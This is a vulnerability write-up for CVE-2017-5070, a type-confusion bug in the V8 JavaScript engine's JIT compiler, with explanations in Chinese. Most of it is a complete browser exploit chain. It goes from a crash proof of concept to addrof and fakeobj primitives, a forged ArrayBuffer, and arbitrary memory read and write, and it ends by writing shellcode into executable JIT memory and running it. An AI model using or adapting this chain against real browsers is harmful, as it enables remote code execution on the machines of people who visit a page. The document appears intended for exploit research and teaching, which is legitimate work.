## CVE-2017-5070

#### poc:

```
var array = [[{}], [1.1]];
var double_arr2 = [1.1,2.2];
function transition() {
  for(var i = 0; i < array.length; i++){
    var arr = array[i];
    arr[0] = {};
  }

}

var flag = 0;
function swap() {
  try {} catch(e) {}  // Prevent Crankshaft from inlining this.
  if (flag == 1) {
    array[1] = double_arr2;
  }
}
var expected = 6.176516726456e-312;
function f(){
  Math.sin(1);
  swap();  
  double_arr2[0] = 1;
  transition(); 
  double_arr2[1] = expected; 
  
}
%DebugPrint(double_arr2);
f();
%OptimizeFunctionOnNextCall(f);
flag = 1;
f();

print ("111");
print (expected === double_arr2[1]); <------- Crash!!!
print ("222")
```

poc的关键在于swap和transition。

首先需要注意swap函数不能太过简单，不然在jit优化的过程中就会被inline到f()

transition函数的作用是触发v8对array中两个元素的优化。并且当flag为1时，还会一起对double_arr2进行优化处理。

我们在正常的情况下，double_arr2中保存的是指向double对象的指针，在正常访问时，会通过指针找到对应的double值。

但是在poc中因为执行次数太多，swap和transition会进行JIT优化并去除一些类型检查。最终的效果就是double_arr2在访问时会直接把自己的元素上保存的数据当作double值给直接返回出来，而不是正常情况下把它们作为double对象的指针去寻找目标内存中下一个的数据作为double来返回。

最终漏洞成因：
由于double_arr2直接把自己元素的指针当作double来返回了，所以在f()里直接对double_arr2进行object赋值，这样访问double_arr后就能直接得到object的地址了。

#### exp

###### 1、 构造addrof 任意地址读原语


```
flag = 0;
var array1 = [[{}], [1.1]];  
var double_arr1  = [1.1, 2.2]; 
function AddrOfObj1(object){

    function swap(){ // swap
        try {} catch(e) {}
        if(flag == 1){
            array1[0x1] = double_arr1;
        }
    };
    
    function transition(arr,obj){ // transition
        for(var i = 0;i < arr.length;i++){
            var o = arr[i];
            o[0] = obj;
        }
    }
    function poc(){
        swap();
        double_arr1[0] = 1.1;
        transition(array1,object);
        return double_arr1[0];
    }
    for(var i = 0;i < 0x1000;i++){
        transition(array1,object);
    }
    for(var i = 0;i < 0x1000;i++){
        poc();
    }
        
    flag = 1;
    re = uint32_to_float64(poc()); //uint32-array --> float-array
    return re;
} 
```

###### 2、 leak ab的prototype和constructor地址

```
var ab = new ArrayBuffer(0x200);

var fakeABMap = [
    i2f(0xdaba0000daba0000), 
    i2f(0x000900c03e000008),
    i2f(0x00000000082003ff),
    1.1, // prototype
    2.2, // constructor
    0,
]

var fakeAB = [
    1.1, // ArrayBuffer Map;
    2.2,  // properties (whatever);
    3.3,  // elements (whatever);
    i2f(0x40000000000), // length 0x400
    4.4, // backing store;
    i2f(0x0000000000000004), // copy form ab stucture
    i2f(0)
]

for(i=0;i<3;i++)
{
    gc();
}

var abMapProtoAddr = AddrOfObj1(ab.__proto__);
var abMapConstructAddr = abMapProtoAddr - 0x70;
print("[+] ArrayBuffer Map prototype addr: 0x"+hex(abMapProtoAddr));
print("[+] ArrayBuffer Map Constructor addr: 0x"+hex(abMapConstructAddr));
```

我们利用addrof读取ab.__proto__，也就是ab的prototype地址，之后-0x70也就是constructor的地址。



###### 3、完善fakeABMap

fakemap中的前三个值：type、instance size 和 inobject properties可以是任意的值，最重要的是我们上一步leak的两个地址，我们需要将其填充到fakemap中

```
fakeABMap[3] = i2f(abMapProtoAddr);
fakeABMap[4] = i2f(abMapConstructAddr);
```

###### 4、获得fakeABMap的地址

```
flag = 0;
var array2 = [[{}], [1.1]];  
var double_arr2  = [1.1, 2.2]; 
function AddrOfObj2(object){

    function swap(){ // swap
        try {} catch(e) {}
        if(flag == 1){
            array2[0x1] = double_arr2;
        }
    };
    
    function transition(arr,obj){ // transition
        for(var i = 0;i < arr.length;i++){
            var o = arr[i];
            o[0] = obj;
        }
    }
    function poc(){
        swap();
        double_arr2[0] = 1.1;
        transition(array2,object);
        return double_arr2[0];
    }
    for(var i = 0;i < 0x1000;i++){
        transition(array2,object);
    }
    for(var i = 0;i < 0x1000;i++){
        poc();
    }
        
    flag = 1;
    re = uint32_to_float64(poc()); //uint32-array --> float-array
    return re;
} 


var fakeABMapAddr = AddrOfObj2(fakeABMap) + 0x30; // elements addr of fakeABMap
print("[+] fake ArrayBuffer Map addr: 0x"+hex(fakeABMapAddr));
```
解释一下这里+0x30的原因，我们的fakeABMap是一个数组，v8中数组的内容存储在elements处，所以我们得到fakeABMap后+0x30才能获得fake的内容。


###### 5、将fakemap添加到fake AB的map位置

```
fakeAB[0] = i2f(fakeABMapAddr);
```

###### 6、获得fake AB的地址

```
flag = 0;
var array3 = [[{}], [1.1]];  
var double_arr3  = [1.1, 2.2]; 
function AddrOfObj3(object){

    function swap(){ // swap
        try {} catch(e) {}
        if(flag == 1){
            array3[0x1] = double_arr3;
        }
    };
    
    function transition(arr,obj){ // transition
        for(var i = 0;i < arr.length;i++){
            var o = arr[i];
            o[0] = obj;
        }
    }
    function poc(){
        swap();
        double_arr3[0] = 1.1;
        transition(array3,object);
        return double_arr3[0];
    }
    for(var i = 0;i < 0x1000;i++){
        transition(array3,object);
    }
    for(var i = 0;i < 0x1000;i++){
        poc();
    }
        
    flag = 1;
    re = uint32_to_float64(poc()); //uint32-array --> float-array
    return re;
}

var fakeABAddr = AddrOfObj3(fakeAB) + 0x30 ; // elements addr of fakeAB
print ("[+] fake ArrayBuffer addr: 0x"+hex(fakeABAddr));
```
依旧是获取数组的elements。

###### 7、使fake AB合法


```
flag = 0;
var array4 = [[{}], [1.1]];  
var double_arr4  = [1.1, 2.2]; 
function FakeObj(object){

    function swap(){ // swap
        try {} catch(e) {}
        if(flag == 1){
            array4[0x1] = double_arr4;
        }
    };
    
    function transition(arr,obj){ // transition
        for(var i = 0;i < arr.length;i++){
            var o = arr[i];
            o[0] = obj;
        }
    }
    function poc(){
        swap();
        double_arr4[0] = 1.1;
        transition(array4,object);
        return double_arr4[0];
    }
    for(var i = 0;i < 0x1000;i++){
        transition(array4,object);
    }
    for(var i = 0;i < 0x1000;i++){
        poc();
    }
        
    flag = 1;
    re = uint32_to_float64(poc()); //uint32-array --> float-array
    return re;
}

var fakeABObj = FakeObj(i2f(fakeABAddr));
var dataView = new DataView(fakeABObj);
```

###### 8、获得rwx

```
flag = 0;
var array5 = [[{}], [1.1]];  
var double_arr5  = [1.1, 2.2]; 
function AddrOfObj5(object){

    function swap(){ // swap
        try {} catch(e) {}
        if(flag == 1){
            array5[0x1] = double_arr5;
        }
    };
    
    function transition(arr,obj){ // transition
        for(var i = 0;i < arr.length;i++){
            var o = arr[i];
            o[0] = obj;
        }
    }
    function poc(){
        swap();
        double_arr5[0] = 1.1;
        transition(array5,object);
        return double_arr5[0];
    }
    for(var i = 0;i < 0x1000;i++){
        transition(array5,object);
    }
    for(var i = 0;i < 0x1000;i++){
        poc();
    }
        
    flag = 1;
    re = uint32_to_float64(poc()); //uint32-array --> float-array
    return re;
}

var jitObjAddr = AddrOfObj5(jitObj)-1;
print("[+] jit obj addr: 0x"+hex(jitObjAddr));

var rwxAddr = dataViewRead64(i2f(jitObjAddr+0x38));
print("[+] jit obj addr: 0x"+hex(jitObjAddr));
print("[+] rwx addr: 0x"+hex(rwxAddr));
```

```
// aar primitive
function dataViewRead64(addr)
{

    fakeAB[4] = addr; // overwrite fakeAB[4], which is corresponding to backing store pointer

    return f2i(dataView.getFloat64(0, true));
}

// aaw primitive
function dataViewWrite(addr, payload)
{

    fakeAB[4] = addr;

    for (let i=0; i<payload.length; i++) {
        dataView.setUint8(i, payload[i]);
    }
    return ;
}
```

###### 9、getshell

```
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataViewWrite(i2f(rwxAddr), shellcode);

jitObj();
```





